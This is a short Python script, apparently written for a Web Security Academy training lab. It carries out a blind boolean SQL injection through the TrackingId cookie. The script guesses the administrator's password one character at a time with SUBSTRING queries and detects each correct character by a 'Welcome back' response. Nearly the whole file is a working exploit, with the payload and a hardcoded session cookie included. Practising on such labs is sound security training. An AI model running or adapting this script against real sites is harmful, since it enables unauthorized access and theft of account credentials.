import requests 
import string

url = 'https://0a540046033d0e6b803d547a00ec00da.web-security-academy.net/'
port = 8080
cookie = {
    "TrackingId": "n1JzsdUSWNcuMn4i", 
    "session": "0VPXEFDteReEtqtZnXzbEdScvQP3iGYf"
}

allstring = string.ascii_lowercase + string.digits

track_id = cookie["TrackingId"]

client = requests.Session()
paswrd = ""
response = client.get(url,cookies=cookie, timeout=10)
print(response.status_code)
for num in range(1,21):
    for a in allstring:
       payload= (
           f"{track_id}'AND "
           f"(SELECT SUBSTRING(password,{num},1) "
           f"FROM users WHERE username='administrator')='{a}'--"
       )
       cookie = {
           "TrackingId": payload,
           "session" : "0VPXEFDteReEtqtZnXzbEdScvQP3iGYf" 
       }
       response = client.get(url, cookies=cookie,timeout=10)
       if "Welcome back" in response.text:
           paswrd += a
           break
print(paswrd)
